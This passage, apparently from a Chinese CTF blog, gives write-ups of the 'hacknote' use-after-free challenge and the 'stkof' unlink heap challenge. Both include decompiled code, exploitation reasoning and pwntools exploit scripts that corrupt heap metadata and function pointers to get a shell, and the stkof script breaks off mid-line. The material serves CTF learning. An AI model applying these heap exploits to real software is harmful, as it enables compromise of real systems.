./use_after_free</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="2-hacknote复现"><a href="#2-hacknote复现" class="headerlink" title="2.hacknote复现"></a>2.hacknote复现</h2><p>​        (Link - <a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/use_after_free/hitcon-training-hacknote">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/use_after_free/hitcon-training-hacknote</a>)</p>
<h4 id="A-题目分析"><a href="#A-题目分析" class="headerlink" title="A.题目分析"></a>A.题目分析</h4><p>​        常规操作：丢Ubuntu 1.checksec 2.file（其实有保护也不会绕过。。。tcl）</p>
<div align="center"><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/UAF-Hacknote/(1).png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/UAF-Hacknote/(1).png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="heap 1" style="zoom: 47%;" /> </div>  
​        然后丢IDA看源码和伪码：

<img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/UAF-Hacknote/(2).png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/UAF-Hacknote/(2).png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="exploit function" style="zoom:100%;" />

<p>​        主要函数有这几个，添加删除输出主函数，magic()是喜闻乐见的system后门。菜鸡看到后门函数的第一直觉就是改got表，或者ROP。。。但这里好像不太行，怎么说也是个正经堆题啊。</p>
<p>​        add_note:</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">add_note</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _DWORD *v0; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+Ch] [ebp-1Ch]</span></span><br><span class="line">  <span class="keyword">int</span> size; <span class="comment">// [esp+10h] [ebp-18h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+14h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( count &lt;= <span class="number">5</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !notelist[i] )</span><br><span class="line">      &#123;</span><br><span class="line">        notelist[i] = <span class="built_in">malloc</span>(<span class="number">8u</span>);</span><br><span class="line">        <span class="keyword">if</span> ( !notelist[i] )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Alloca Error&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        *notelist[i] = print_note_content;      <span class="comment">// put字段，*notelist[i]为函数指针</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Note size :&quot;</span>);</span><br><span class="line">        <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">8u</span>);</span><br><span class="line">        size = <span class="built_in">atoi</span>(&amp;buf);</span><br><span class="line">        v0 = notelist[i];</span><br><span class="line">        v0[<span class="number">1</span>] = <span class="built_in">malloc</span>(size);</span><br><span class="line">        <span class="keyword">if</span> ( !*(notelist[i] + <span class="number">1</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Alloca Error&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Content :&quot;</span>);</span><br><span class="line">        <span class="built_in">read</span>(<span class="number">0</span>, *(notelist[i] + <span class="number">1</span>), size);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Success !&quot;</span>);</span><br><span class="line">        ++count;</span><br><span class="line">        <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v5;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Full&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        print_note:调用了note中的函数指针，即print_content_function()函数</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">print_note</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">  v1 = <span class="built_in">atoi</span>(&amp;buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt;= count )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( notelist[v1] )</span><br><span class="line">    (*notelist[v1])(notelist[v1]);              <span class="comment">// 调用notelist[v1]所指函数</span></span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;             <span class="comment">// 因此利用思路为：改写notelist[v1]之所指</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        del_note:在此函数中发现，函数仅对堆进行free，但并未置空，因此存在UAF漏洞。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">del_note</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">  v1 = <span class="built_in">atoi</span>(&amp;buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt;= count )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( notelist[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(*(notelist[v1] + <span class="number">1</span>));</span><br><span class="line">    <span class="built_in">free</span>(notelist[v1]);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        还有要注意的是，对于每个note，都有一个notelist函数指针ptr，指向print_note_content()。并在新建note的时候就会被初始化为print_note_content(),所以无法对于单个note的ptr进行改写。</p>
<p>print_note_content:</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">print_note_content</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(*(a1 + <span class="number">4</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        也就是说每一个note，都包含了两个chunk，第一个（8 bytes）存的是函数指针ptr，另一个是指向内容的指针ptr_content。第二个存的是用户输入的content。</p>
<h3 id="B-利用思路"><a href="#B-利用思路" class="headerlink" title="B.利用思路"></a>B.利用思路</h3><p>​        1.能由用户控制的内容只有content，所以基本思路就是用一个note_a的输入过程，去改写note_b的函数指针ptr，再print(note_b)</p>
<p>​        2.要使得note_b被note_a改写，除非后者进行堆溢出，或者两者再某一时刻同时指向同一块内存区域。因此可以想到利用UAF漏洞，先free(note_b)再add(note_a)，将payload写入到note_a中。</p>
<p>​        3.如果有两个相邻的note，四个相邻的chunk，结构如下：</p>
<div align="center"><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/UAF-Hacknote/(3).png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/UAF-Hacknote/(3).png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="heap 1" style="zoom: 37%;" /> </div>
- 对于函数指针和内容指针，各占4 Bytes，再加上其他chunk数据并遵循堆内存对齐，可知chunk1和chunk3分别为16 Bytes。

<ul>
<li><p>分别free之后bin链表内容为：(head) chunk1 –&gt; chunk2 –&gt; chunk3 –&gt; chunk4 (tail)此时再申请出note2，作为改写用的note_a。</p>
</li>
<li><p>而在malloc时，如果chunk2和chunk4的大小(即size of content)大于16 Bytes，且note_a大小小于16 Bytes，系统就会从bin链表尾部向头部寻找适当大小的已释放chunk，进而将chunk3和chunk1分配给note_a，而chunk3和chunk1中的两个指针正是我们要改写的地方。</p>
</li>
<li><p>所以我们知道，需要给note0和note1的content部分分配32bytes的大小。</p>
<div align="center"><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/UAF-Hacknote/(4).png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/UAF-Hacknote/(4).png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="heap 2" style="zoom:37%;" /></div>
​    4.内存分配情况决定之后，只需要将note0视作note_b，在note_a中写入payload（note_a的content部分与note_b的content部分为同一内存块），即可改写note_b的函数指针。调用函数print(note_b)即可getshell。</li>
</ul>
<h3 id="C-exp"><a href="#C-exp" class="headerlink" title="C.exp:"></a>C.exp:</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = process(<span class="string">&#x27;./hacknote&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addnote</span>(<span class="params">size, content</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delnote</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printnote</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">magic = <span class="number">0x08048986</span></span><br><span class="line"></span><br><span class="line">addnote(<span class="number">32</span>, <span class="string">&quot;aaaa&quot;</span>) <span class="comment"># add note 0</span></span><br><span class="line">addnote(<span class="number">32</span>, <span class="string">&quot;ddaa&quot;</span>) <span class="comment"># add note 1</span></span><br><span class="line"></span><br><span class="line">delnote(<span class="number">0</span>) <span class="comment"># delete note 0</span></span><br><span class="line">delnote(<span class="number">1</span>) <span class="comment"># delete note 1</span></span><br><span class="line"></span><br><span class="line">addnote(<span class="number">8</span>, p32(magic)) <span class="comment"># add note 2</span></span><br><span class="line"></span><br><span class="line">printnote(<span class="number">0</span>) <span class="comment"># print note 0</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>Unlink(stkof)</title>
    <url>/2020/03/02/Unlink-stkof/</url>
    <content><![CDATA[<p>​        关于unlink的介绍和入门。。。。<span id="more"></span></p>
<p>​        unlink也是一个看了好久看不懂的东西，今天算是整明白了。</p>
<h2 id="0x00-unlink-漏洞"><a href="#0x00-unlink-漏洞" class="headerlink" title="0x00 . unlink 漏洞"></a>0x00 . unlink 漏洞</h2><h3 id="A-unlink原理"><a href="#A-unlink原理" class="headerlink" title="A . unlink原理"></a>A . unlink原理</h3><p>​        假设有如下chunk0，chunk1，其中chunk0是使用中的small，chunk1是已释放的small chunk，两者在内存上相邻。</p>
<p>​        由于chunk1已释放，所以位于small bin链表中，又与chunk2，chunk3在链表结构上相邻。</p>
<img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/Unlink-stkof/1.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/Unlink-stkof/1.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom:50%;" />

<p>​        此时如果free(chunk0)，glibc机制就会判断前后(内存上)有无相邻的已释放chunk，如果有，就和chunk0一同合并成一个大chunk。而与此同时，还要把chunk1从small bin中“拔出来”，其中发生的断链，修改链表的操作就是unlink。换言之unlink就是一个从双向链表中抽出一个chunk的操作。（photo from ctf-wiki）</p>
<p>​        <img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/Unlink-stkof/2.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/Unlink-stkof/2.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom:67%;" /></p>
<p>​        所以unlink只适用于非fast chunk，因为fast chunk不存在双向链表，同时fast chunk也并不是用完就马上回收的。</p>
<h3 id="B-历史的漏洞利用（32-bit）"><a href="#B-历史的漏洞利用（32-bit）" class="headerlink" title="B . 历史的漏洞利用（32 bit）"></a>B . 历史的漏洞利用（32 bit）</h3><p>​        那么如何通过unlink达到任意写的目的呢？曾经的unlink利用是这样的：</p>
<p>​        <img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/Unlink-stkof/3.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/Unlink-stkof/3.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom:55%;" /></p>
<p>​        1.在进行unlink之前修改chunk0的fd和bk，使得FD = target_addr，BK = expect value（可以通过堆溢出或其他漏洞修改，或者构造fake chunk）。</p>
<p>​        2.进行合并操作，需要将chunk1的前驱后继的指向修改一下，改成chunk0的前驱后继，也就是将chunk1的FD和BK改成chunk0的FD和BK，在一起总要一条心嘛。</p>
<p>​        3.此时chunk1已经FD写入了target_addr，BK写入了expect value，在释放chunk0，使得chunk1进行unlink。</p>
<p>​        4.chunk1的unlink，实际上就是修改small bin中的前驱后继，将前驱的后继（原本是chunk1）改成自己的后继，将后继的前驱（原本是chunk1）改成自己的前驱。而系统是怎么修改前驱后继的呢，就是修改FD指针 + 8的地址（heap head 占8个字节，紧接着就是该chunk的fd指针）和修改FD指针 + 12的地址（heap head占8 Bytes，fd占4 Bytes，紧接着就是该chunk的bk指针）。</p>
<p>​        5.所以系统会将chunk1的FD–&gt;bk改成自己的BK，将BK–&gt;fd改成自己的FD，换句话说就是。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">FD-&gt;bk=BK;	<span class="comment">//target_addr - 12 + 12 = expect value;</span></span><br><span class="line">BK-&gt;fd=FD;	<span class="comment">//expect value + 8 = target_addr;</span></span><br></pre></td></tr></table></figure>

<p>​        这样就实现了任意写。</p>
<h3 id="C-如今的漏洞利用-（64-bit）"><a href="#C-如今的漏洞利用-（64-bit）" class="headerlink" title="C . 如今的漏洞利用 （64 bit）"></a>C . 如今的漏洞利用 （64 bit）</h3><p>​        但是现在的glibc加强了保护机制，增加了以下检查过程。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// fd bk</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                      \</span><br><span class="line">  <span class="built_in">malloc_printerr</span> (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  \</span><br></pre></td></tr></table></figure>

<p>​        也就是说，必须使得chunk1前驱的后继，和后继的前驱都指向同一个p。至于p是啥，正常情况下当然是chunk1咯，但是既然要漏洞利用，那当然不能顺着系统机制来。</p>
<p>​        我们进行如下构造：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">chunk1-&gt;FD = p - <span class="number">0x18</span>;</span><br><span class="line">chunk1-&gt;BK = p - <span class="number">0x10</span>;</span><br></pre></td></tr></table></figure>

<p>​        那么系统检查时就会进行如下判断：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">chunk1-&gt;FD-&gt;bk == chunk1-&gt;BK-&gt;fd ;	<span class="comment">//bingo!! </span></span><br><span class="line">p - <span class="number">0x18</span> + <span class="number">0x18</span> == p - <span class="number">0x10</span> +<span class="number">0x10</span>; 	<span class="comment">// We pass!!</span></span><br></pre></td></tr></table></figure>

<p>​        既然检查过了，就进行unlink吧。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">chunk1-&gt;FD-&gt;bk = chunk1-&gt;BK;		<span class="comment">//p - 0x18 + 0x18 = p - 0x10</span></span><br><span class="line">chunk1-&gt;BK-&gt;fd = chunk1-&gt;FD;		<span class="comment">//p - 0x10 + 0x10 = p - 0x18</span></span><br></pre></td></tr></table></figure>

<p>​        也就是说，我们把p指针向前偏移了0x18。虽然不算是任意写，但也足够利用了。</p>
<h2 id="0x01-stkof-writeup"><a href="#0x01-stkof-writeup" class="headerlink" title="0x01 . stkof writeup"></a>0x01 . stkof writeup</h2><h3 id="A-程序分析"><a href="#A-程序分析" class="headerlink" title="A . 程序分析"></a>A . 程序分析</h3><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/Unlink-stkof/4.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/Unlink-stkof/4.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom:40%;" />

<p>​        useless()的功能大概是用来测试用户输出的chunk序号是否已分配，仅此而已。在主函数里没有找到可以输出的函数，所以可以考虑覆写got表来leak libc。</p>
<p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/Unlink-stkof/5.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/Unlink-stkof/5.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p>
<p>​        至于其他函数：</p>
<ul>
<li><p>add()没什么特别的。</p>
</li>
<li><p>delete()中free()后未将指针置空</p>
</li>
<li><p>fill()中再让用户输入一遍size，不同于add()中的size，因此可以堆溢出。    </p>
</li>
</ul>
<p>​        在本程序的几个重要函数中可以可以发现，chunk的堆指针被存放在了一个数组s[ ]中，而双击数组s可以发现，其地址是0x0602140，它是一个位于bss段的指针数组，换言之是一个可写的全局变量。s是我们覆写got表的关键。</p>
<p>​        有全局变量存在，可以利用unlink漏洞覆写got表了。</p>
<h3 id="B-内存布局"><a href="#B-内存布局" class="headerlink" title="B .内存布局"></a>B .内存布局</h3><ul>
<li>申请4个chunk，其中chunk2是small chunk。（本程序没有申请限制，可以申请多一点，只要方便布局。）</li>
<li>用chunk1的堆溢出覆盖chunk2，改写其FD和BK成s[0]-0x10(即chunk2指针)，改写chunk3的头信息。</li>
<li>在上一步完成的同时要通过检查，使系统在释放chunk3时相信chunk2也已经释放了，从而向前合并。</li>
<li>这一合并不要紧，系统一不小心就把chunk2处的存放的指针向低地址偏移了0x18，够我们地肆无忌惮发挥了。</li>
</ul>
<h3 id="C-Leak-amp-Getshell"><a href="#C-Leak-amp-Getshell" class="headerlink" title="C . Leak &amp; Getshell"></a>C . Leak &amp; Getshell</h3><ul>
<li>再改写chunk2的内容，实际上就是覆写s数组，改写chunk指针。此时可写入got表地址了。</li>
<li>覆写情况：s[0]=free@got,s[1]=puts@got,s[2]=atol@got。</li>
<li>再利用fill函数将free@got改成puts@got，free[1]就得到了puts@plt。</li>
<li>通过计算，得到libc地址和system地址，通过elf文件搜索可以找到“/bin/sh”。</li>
<li>利用fil将atol@got改写成system地址。</li>
<li>最后直接发送”/bin/sh”都会调用system函数，getshell。</li>
</ul>
<h3 id="D-Exp"><a href="#D-Exp" class="headerlink" title="D . Exp"></a>D . Exp</h3><p>​    贴一下脚本呗，虽然不是自己写的。（exp from ctf-wiki）有空再自己写一遍。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;DEBUG&#x27;</span>]:</span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.binary = <span class="string">&quot;./stkof&quot;</span></span><br><span class="line">stkof = ELF(<span class="string">&#x27;./stkof&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">7777</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(<span class="string">&quot;./stkof&quot;</span>)</span><br><span class="line">log.info(<span class="string">&#x27;PID: &#x27;</span> + <span class="built_in">str</span>(proc.pidof(p)[<span class="number">0</span>]))</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">head = <span class="number">0x602140</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span>(<span class="params">size</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;OK\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, size, content</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.send(content)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;OK\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    <span class="comment"># trigger to malloc buffer for io function</span></span><br><span class="line">    alloc(<span class="number">0x100</span>)  <span class="comment"># idx 1</span></span><br><span class="line">    <span class="comment"># begin</span></span><br><span class="line">    alloc(<span class="number">0x30</span>)  <span class="comment"># idx 2</span></span><br><span class="line">    <span class="comment"># small chunk size in order to trigger unlink</span></span><br><span class="line">    alloc(<span class="number">0x80</span>)  <span class="comment"># idx 3</span></span><br><span class="line">    <span class="comment"># a fake chunk at global[2]=head+16 who&#x27;s size is 0x20</span></span><br><span class="line">    payload = p64(<span class="number">0</span>)  <span class="comment">#prev_size</span></span><br><span class="line">    payload += p64(<span class="number">0x20</span>)  <span class="comment">#size</span></span><br><span class="line">    payload += p64(head + <span class="number">16</span> - <span class="number">0x18</span>)  <span class="comment">#fd</span></span><br><span class="line">    payload += p64(head + <span class="number">16</span> - <span class="number">0x10</span>)  <span class="comment">#bk</span></span><br><span class="line">    payload += p64(<span class="number">0x20</span>)  <span class="comment"># next chunk&#x27;s prev_size bypass the check</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x30</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># overwrite global[3]&#x27;s chunk&#x27;s prev_size</span></span><br><span class="line">    <span class="comment"># make it believe that prev chunk is at global[2]</span></span><br><span class="line">    payload += p64(<span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># make it believe that prev chunk is free</span></span><br><span class="line">    payload += p64(<span class="number">0x90</span>)</span><br><span class="line">    edit(<span class="number">2</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># unlink fake chunk, so global[2] =&amp;(global[2])-0x18=head-8</span></span><br><span class="line">    free(<span 